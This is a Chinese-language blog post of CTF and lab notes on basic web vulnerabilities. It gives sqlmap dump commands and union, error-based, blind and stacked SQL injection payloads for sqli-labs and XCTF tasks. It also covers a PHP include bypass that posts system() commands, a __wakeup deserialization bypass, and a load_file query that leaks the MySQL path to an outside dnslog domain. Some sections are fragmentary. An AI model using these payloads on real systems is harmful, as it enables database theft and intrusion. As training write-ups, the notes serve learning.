<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>基本漏洞 | haoe</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="SQL盲注注入概念：在不知道数据库返回值的情况下，对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注，以及报错的盲注。 可能用到的函数： Length()函数   返回字符串的长度 Substr()截取字符串从1开始 Ascii() 返回字符串的ascii码  sqlmap自动注入例题：ctfhubSQL注入布尔盲注 链接：https:&#x2F;&#x2F;www.ctfhub.com&#x2F;#">
<meta property="og:type" content="article">
<meta property="og:title" content="基本漏洞">
<meta property="og:url" content="http://example.com/2022/04/05/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="haoe">
<meta property="og:description" content="SQL盲注注入概念：在不知道数据库返回值的情况下，对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注，以及报错的盲注。 可能用到的函数： Length()函数   返回字符串的长度 Substr()截取字符串从1开始 Ascii() 返回字符串的ascii码  sqlmap自动注入例题：ctfhubSQL注入布尔盲注 链接：https:&#x2F;&#x2F;www.ctfhub.com&#x2F;#">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img.le1a.com/2022/04/09/9c38ddf4c4bf6.png">
<meta property="og:image" content="https://img.le1a.com/2022/04/09/b0d432090354b.png">
<meta property="og:image" content="https://img.le1a.com/2022/04/09/b65ba15583869.png">
<meta property="og:image" content="https://img.le1a.com/2022/04/15/957e01e40c917.png">
<meta property="og:image" content="https://img.le1a.com/2022/04/15/e433d65168075.png">
<meta property="og:image" content="https://img.le1a.com/2022/04/15/05051eb1646e4.png">
<meta property="og:image" content="https://img.le1a.com/2022/04/15/33fb5621f3c90.png">
<meta property="article:published_time" content="2022-04-05T14:24:38.566Z">
<meta property="article:modified_time" content="2022-05-05T15:25:55.111Z">
<meta property="article:author" content="haoe555">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.le1a.com/2022/04/09/9c38ddf4c4bf6.png">
  
    <link rel="alternate" href="/atom.xml" title="haoe" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">haoe</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-漏洞基础" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/04/05/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" class="article-date">
  <time datetime="2022-04-05T14:24:38.566Z" itemprop="datePublished">2022-04-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      基本漏洞
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="SQL盲注注入"><a href="#SQL盲注注入" class="headerlink" title="SQL盲注注入"></a>SQL盲注注入</h1><p><strong>概念</strong>：在不知道数据库返回值的情况下，对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注，以及报错的盲注。</p>
<p>可能用到的函数：</p>
<p>Length()函数   返回字符串的长度</p>
<p>Substr()截取字符串从1开始</p>
<p>Ascii() 返回字符串的ascii码</p>
<hr>
<h3 id="sqlmap自动注入"><a href="#sqlmap自动注入" class="headerlink" title="sqlmap自动注入"></a><strong>sqlmap自动注入</strong></h3><p>例题：ctfhubSQL注入<strong>布尔盲注</strong> 链接：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">https://www.ctfhub.com/#/skilltree</a></p>
<p>打开虚拟机终端，输入<strong>sudo -i</strong>,获得root</p>
<p><strong>sqlmap -u “ url”</strong></p>
<p>通过这个可以判断是否存在注入点（如果存在数据库相关信息说明存在注入点）</p>
<p>盲注时，后面需要加上–batch（作用：让工具自动化运行）</p>
<p>语法：<strong>sqlmap -u”url” –batch</strong></p>
<p>ps:需要参数，不要直接复制链接过来</p>
<p>eg:<a target="_blank" rel="noopener" href="http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/,%E8%BF%99%E7%A7%8D%EF%BC%8C%E6%BC%8FNO">http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/,这种，漏NO</a></p>
<p>eg:<a target="_blank" rel="noopener" href="http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/?id=1%EF%BC%8C%E8%BF%99%E7%A7%8D%EF%BC%8CYES">http://challenge-16d2f4968e269cfb.sandbox.ctfhub.com:10800/?id=1，这种，YES</a></p>
<p>这里有数据库的相关信息，如图：</p>
<p><img src="https://img.le1a.com/2022/04/09/9c38ddf4c4bf6.png"></p>
<p><strong>sqlmap -u “url” –dbs –batch</strong></p>
<p>输入指令，看它提供的数据库名称</p>
<p><img src="https://img.le1a.com/2022/04/09/b0d432090354b.png"></p>
<p>看打*部分可知，数据库为 sqli</p>
<p>-D这个参数是用来进入数据库的，通常要配合–tables使用（语法）<br>$$<br>sqlmap -u “url” –dbs -D 数据库名称 –tables –batch<br>$$<br>–tables 这个参数是用来显示当前数据库的表（就是这个命令）</p>
<p><img src="https://img.le1a.com/2022/04/09/b65ba15583869.png"><br>$$<br><strong>sqlmap -u “url” –dbs -D 数据库名称 –tables -T 表名 –columns –dump –batch</strong><br>$$<br>–dump是导出</p>
<p>即可获得flag</p>
<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><h4 id="1-数字型判断是否有注入："><a href="#1-数字型判断是否有注入：" class="headerlink" title="1.数字型判断是否有注入："></a><strong>1.数字型判断是否有注入：</strong></h4><p><strong>语句</strong>：and 1=1 ;and 1=2 </p>
<p><strong>结果</strong>:如果输入and 1=1 能正常显示原页面内容，输入and 1=2不能正常显示原页面内容，就说明有SQL注入漏洞</p>
<p><strong>分析</strong>：and 的意思是“和”如果没有过滤我们的语句，and 1=1就会被代入SQL查询语句进行查询，<br>如果and前后的两条语句都是真的话就不会出错，但如果前后语句有一个为假的话，程序就会暴错。<br>也就表明程序有注入漏洞</p>
<p>？id=1 order by [数字]</p>
<p>例题攻防世界（随便注）<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5417&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5417&amp;page=1</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure>

<p>上面的关键字都被过滤不能使用了，没法进行注入，</p>
<p><strong>下面尝试堆叠注入，在mysql中：一行是可以执行多条命令的，使用结束符 ； 分号 达到执行多条命令的效果。</strong></p>
<p><strong>好在 show 函数没有被过滤，最大程度利用一下：</strong></p>
<p>1’;show databases;#【　<strong>井号是注释符，表示单行后边的都注释掉的意思，经过测试，这题并没有过滤注释符；</strong>】</p>
<p><strong>查询所有表:</strong></p>
<p>查询supersqli库中的所有表【　<strong>上一条是查所有数据库名，这一条是查当前数据库的所有表名；</strong>】</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p>得到表名</p>
<p>1’;show columns from 表名 【　<strong>这条用于查字段，有个条件是需要知道表名，表名在第二条就已经找到，不惊慌；</strong>】</p>
<p> 如：words</p>
<p>则写为</p>
<p>1’;show columns from words;#</p>
<p>若为字符串1919810931114514</p>
<p>则写为</p>
<p>1’;show columns from <code>1919810931114514</code>;#      (字符串为表名操作时要加反引号,切换英文键，单击数字1左边)</p>
<p>发现flag，但是</p>
<h2 id="cookie手动注入"><a href="#cookie手动注入" class="headerlink" title="cookie手动注入"></a>cookie手动注入</h2><p>什么是Cookie？</p>
<p>百度的回答是一种能够让网站服务器把少量数据储存到客户端的硬盘或内存，或是从客户端的硬盘读取数据的一种技术。当用户第一次访问页面的时候，服务器会生成一个用户特有的Cookie，之后浏览器会根据用户设置的Cookie信息加载出内容</p>
<p>简单来说，Cookie其实就是用户凭证的意思</p>
<p>知道什么是Cookie后，得判断是否为Cookie注入，提交数据并非只有get、post这两种方式，还有一种经常被用到的方式，request方法，通过这种方法可以从用户提交的参数中获取参数值，这就造成了Cookie注入的最基本条件</p>
<p> <strong>获取数据库sqli中的表名</strong></p>
<p>id = 0 union select 1,group_concat(table_name) from<br>    information_schema.tables where table_schema=’sqli’</p>
<p> <strong>获取数据表lugalhjclh中的字段名</strong></p>
<p>id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name=’lugalhjclh’;</p>
<p><strong>获取字段ihkgnewavc的值</strong></p>
<p>id=0 union select 1,group_concat(lugalhjclh) from ihkgnewavc;</p>
<h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p>1.输入 -1 union select 1,2</p>
<p>在注入后回显并显示内容，判断为UA注入</p>
<p>-1 union select database(),1 查库名</p>
<h1 id="攻防世界web-php-include"><a href="#攻防世界web-php-include" class="headerlink" title="攻防世界web php include"></a>攻防世界web php include</h1><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p><code>&lt;?php</code><br><code>show_source(__FILE__);</code><br><code>echo $_GET[&#39;hello&#39;]; $page=$_GET[&#39;page&#39;];</code><br><code>while (strstr($page, &quot;php://&quot;)) &#123;</code><br>    <code>$page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);</code><br><code>&#125;</code><br><code>include($page);</code><br><code>?&gt;</code></p>
<p>解析：page中带有php://的都会被替换成空</p>
<p><strong>strstr()：</strong></p>
<p>定义和用法：<br>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。<br>区分大小写，stristr()函数不区分大小写<br>语法：<br>strstr(string,search,before_search)<br>string:必需，被搜索的字符串<br>search:必需，要搜索的字符串，若是数字，则搜索对应的ASCII值的字符<br>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分</p>
<p><strong>str_replace():</strong><br> 定义和用法：<br> <strong>以其它字符替换字符串中的一些字符（区分大小写）</strong></p>
<p>语法：<br> str_replace(find,replace,string,count)<br> find,必需，要查找的值<br> replace，必需，要替换的值<br> string，必需，被搜索的字符串<br> count，可选，替换次数</p>
<p><strong>总结</strong>：程序过滤掉了page=参数传入php://</p>
<p>大小写</p>
<p>post传参</p>
<?php

system("ls")

?>

<p>页面会出现一串fl4gisisish3r3.php</p>
<p>利用cat打开</p>
<p>post注入代码</p>
<?php

system("cat fl4gisisish3r3.php")

?>

<p>f12点击查看器，即可发现flag</p>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p><code>&lt;?php</code><br><code>$a = array(&#39;a&#39; =&gt; &#39;Apple&#39; ,&#39;b&#39; =&gt; &#39;banana&#39; , &#39;c&#39; =&gt; &#39;Coconut&#39;);</code></p>
<p><code>//序列化数组</code><br><code>$s = serialize($a);</code><br><code>echo $s;</code><br><code>//输出结果：a:3:&#123;s:1:&quot;a&quot;;s:5:&quot;Apple&quot;;s:1:&quot;b&quot;;s:6:&quot;banana&quot;;s:1:&quot;c&quot;;s:7:&quot;Coconut&quot;;&#125;</code><br><code>?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Apple&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;banana&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Coconut&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>解析:【序列化字符串各部分简单释义： O代表结构类型为：类:4表示类名长度:接着是类名:属性（成员）个数<br> 大括号内分别是：属性名类型;长度:名称:值类型:长度:值】</p>
<p>a 代表定义的数组为a，a:3是因为有三个数组，s:1,代表序列化数组为s,且长度为1，中间用 ; 连接。</p>
<blockquote>
<blockquote>
<p><code>&lt;?php</code><br><code>class xctf&#123;                      //定义一个名为xctf的类</code><br><code>public $flag = &#39;111&#39;;            //定义一个公有的类属性$flag，值为111</code><br><code>public function __wakeup()&#123;      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</code><br><code>exit(&#39;bad requests&#39;);</code><br><code>&#125;</code><br><code>&#125;</code><br><code>$peak = new xctf();           //使用new运算符来实例化该类（xctf）的对象为peak</code><br><code>echo(serialize($peak));       //输出被序列化的对象（peak）</code><br><code>?&gt;</code></p>
<p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>/*xctf类后面有一个1,整个1表示的是xctf类中只有1个属性<br>__wakeup()漏洞就是与序列化字符串的整个属性个数有关。当序列化字符串所表示的对象，<br>其序列化字符串中属性个数大于真实属性个数时就会跳过__wakeup的执行，从而造成__wakeup()漏洞<br>*/</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因此，我们要反序列化xctf类的同时还要绕过__wakeup方法的执行（如果不绕过<span class="title function_ invoke__">__wakeup</span>()方法，那么将会输出bad requests并退出脚本），<span class="title function_ invoke__">__wakeup</span>()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。因此，需要修改序列化字符串中的属性个数：</span><br><span class="line">当我们将上述的序列化的字符串中的对象属性个数由真实值<span class="number">1</span>修改为<span class="number">3</span>，即如下所示</span><br></pre></td></tr></table></figure>

<p>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</p>
<blockquote>
<h1 id="sqli-labs-wp"><a href="#sqli-labs-wp" class="headerlink" title="sqli labs wp"></a><strong>sqli labs wp</strong></h1><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p><strong>information_schema：表示所有信息，包括库、表、列</strong></p>
<p><strong>information_schema.tables：记录所有表名信息的表</strong></p>
<p><strong>information_schema.columns：记录所有列名信息的表</strong></p>
<p><strong>table_schema：数据库的名称</strong></p>
<p><strong>table_name:表名</strong></p>
<p><strong>column_name:列名</strong></p>
<p><strong>group_concat():显示所有查询到的数据</strong></p>
<h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>输入1正常，输入1‘异常，所以判断为字符型注入</p>
<p>**1.**利用指令确定字段数【order by 语句】</p>
<p>1’ order by 1%23 （执行成功）</p>
<p>1’ order by 2%23 （执行成功）</p>
<p>1’ order by 3%23 （执行成功）</p>
<p>1’ order by 4%23 （报错）</p>
<p>解析：意思为没有第四个字段数，所以推测原本SQL语句只用到了三个字段。</p>
<p> <strong>为什么后面还要加个–+呢?</strong></p>
<p>因为这是一个注释语句，就是把后面的给注释掉，这里后面还有东西，但用不上，把它注释掉就好</p>
<p><strong>PS:</strong> –+可以用#替换，url 提交过程中 Url 编码后的#为%23</p>
<p>直接输入#不可以，输入%23可以，因为#在浏览器中有特殊含义，表示锚点。</p>
<p>**2.**确定哪些为可显字段【】</p>
<p>1’ and 1=2 union select 1,2,3–+</p>
<p>结果如图：</p>
<p><img src="https://img.le1a.com/2022/04/15/957e01e40c917.png"> </p>
<p>解析：因为SQL语句执行结果只有第一行会被回显在页面上，所以我们要把原始语句变为空，这样我们想要的结果才能显示在页面上。</p>
<p>由图可知，回显为2和3</p>
<p>**3.**输入union select 1,2,database()–+看了下使用得数据库</p>
<p><strong>（1）version（）：查看数据库版本</strong> 　</p>
<p><strong>（2）user（）：查看当前用户</strong> 　</p>
<p><strong>（3）database（）：查看使用的数据库</strong> 　</p>
<p><strong>（4） limit  :<code>limit</code>子句来分批获取所有数据</strong> 　</p>
<p><strong>（5）<code>group_concat（）：</code>一次性获取数据库信息。 查看数据库，版本，</strong></p>
<p>  <strong>当前用户 输入union select 1,2,user()–+看用户名</strong> </p>
<p>  <strong>输入union select 1,2,database()–+看使用得数据库（重点）</strong> </p>
<p>  <strong>输入union select 1,2,version()–+看数据库版本</strong></p>
<p><strong>4.</strong></p>
<p>查看表：1’ and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
<p><img src="https://img.le1a.com/2022/04/15/e433d65168075.png"></p>
<p><strong>5.</strong></p>
<p>查字段：union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+</p>
<p><img src="https://img.le1a.com/2022/04/15/05051eb1646e4.png"></p>
<p>**6.**查表中的数据：</p>
<p>union select 1,2,group_concat(username,0x3a,password) from users–+</p>
<p>解析：0x3a是字符冒号’:’对应的16进制的ASCII码</p>
<p><img src="https://img.le1a.com/2022/04/15/33fb5621f3c90.png"></p>
<h4 id="less-2"><a href="#less-2" class="headerlink" title="less 2"></a>less 2</h4><p>整数型注入，其他思路与less 1 一致</p>
<h4 id="less-3"><a href="#less-3" class="headerlink" title="less 3"></a>less 3</h4><p>首先判断注入类型，?id=1’)</p>
<p>但是输入1’报错？</p>
<p>）的作用为:闭合，使得后面的不读取</p>
<h4 id="less-4"><a href="#less-4" class="headerlink" title="less 4"></a>less 4</h4><p>注入类型为,?id=1”)</p>
<h4 id="less-5"><a href="#less-5" class="headerlink" title="less 5"></a>less 5</h4><p><strong>报错注入</strong>（在实际场景中，如果没有一个合适的数据返回点，而是仅仅带入Sql数据进行查询，就需要报错注入）,</p>
<p><strong>布尔盲注</strong></p>
<p>用length()函数</p>
<p>输入</p>
<p>?id=1’  and length(database())=1 –+  (无回显)</p>
<p>?id=1’  and length(database())=2 –+（无回显）</p>
<p>·········</p>
<p>一直到8显示you are in· · ·(有回显)</p>
<p><strong>extractvalue报错</strong><br>示例：</p>
<p>and extractvalue(null,concat(0x7e,(sql_inject),0x7e))   注释：sql_inject 指需要查询的数据。</p>
<p>可以理解为，让后台XML故意报错。</p>
<p>0X7e的具体含义：0x7e=~（类似波浪线符号）</p>
<p>利用这种方式，对后台进行一个排序。指定第一个参数为null，使其故意报错，将第二个参数中的语句带入数据库执行，最后报错显示执行结果。</p>
<p>输入?id=1’ and extractvalue(null,concat(0x7e,(select database()),0x7e))–+</p>
<p>?id=1’ and (substr(database(),1,1)=’s’) –+【通过database()这个表达式表现数据库名，然后从左起第1位开始截取1个字符，以此类推，直到得到所有结果为止】</p>
<p><strong>爆表名</strong></p>
<p>?id=1’ and extractvalue(1,concat(0x23,(select table_name from  information_schema.tables where table_schema=database() limit  1,1),0x23))–+</p>
<p><strong>爆数据</strong></p>
<p>?id=1’ and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))–+</p>
<p>?id=1’ and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))–+</p>
<p>用limit 可以看所有的数据了。</p>
<h4 id="less-6"><a href="#less-6" class="headerlink" title="less 6"></a>less 6</h4><p>and extractvalue(1,concat(0x23,(select column_name from  information_schema.columns where table_schema=database() and  table_name=’referers’ limit 1,1),0x23))–+</p>
<h4 id="less-7"><a href="#less-7" class="headerlink" title="less 7"></a>less 7</h4><p>思路：</p>
<p>首先判断注入类型为字符型，1’ order by 1 –+(报错)</p>
<p>由于之前经验，添加）继续wa,再加一个）  成功 </p>
<p>那么语句部分可能是 <code>where id=((&#39;$id&#39;))</code></p>
<p>判断文件路径</p>
<p>可以利用读文件函数load_file()，结合dnslog.cn网站，实现带外攻击，看到MySQL的安装目录在哪。<br>  先说一下MySQL的load_file()函数。这个函数里面写上文件的路径，就可以实现读取文件内容的操作。不过它只能读取文件，不能读取目录。所以load_file()函数里面一定要写“路径+文件名”，才会有回显。不然就会报错。另外，读本地文件的话，只要写上本地文件的路径就行，绝对路径和相对路径都行。读网络文件的话，要用”\+域名+文件名”的写法。前面写上四个\是为了转义，最终的效果是：\域名\文件名 </p>
<p>接下来，先在dnslog网站上获取一个随机域名。</p>
<p>接下来，构造语句：?id=1’)) and  load_file(concat(’\’,(substr(hex(@@basedir),1,30)),’.r8luxv.dnslog.cn\1.txt’)) –  -，并执行。这个语句中间用了hex()函数，把@@basedir加密。为了避免URL中显示不出某些特殊符号，并且了使用substr()字符串截取函数，因为URL的长度是有限制的。虽然执行完之后页面会报错，但是不影响结果，可以看到dnslog网站上已经出现了一串字符</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><strong>文件包含原理</strong></p>
<p>文件包含<br>开发人员将相同的函数写入单独的文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程称文件包含<br>文件包含漏洞<br>开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞</p>
<h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h4 id="get-和post的区别"><a href="#get-和post的区别" class="headerlink" title="get 和post的区别"></a><strong>get 和post的区别</strong></h4><p><strong>参数的位置大小</strong><br>比方你get 进行注入 别人防了 你没办法<br>但post 你注入 别人防了 你改2个地方<br>一个是http 重连接<br>一个是在post 后面重新构建一个post请求带上 注入<br>第一个post为正常post  但里面在包含一个post</p>
</blockquote>
</blockquote>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/05/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" data-id="cl2t5wovj0000hwuwhzbp7x8z" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/04/05/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">基本漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 haoe555<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>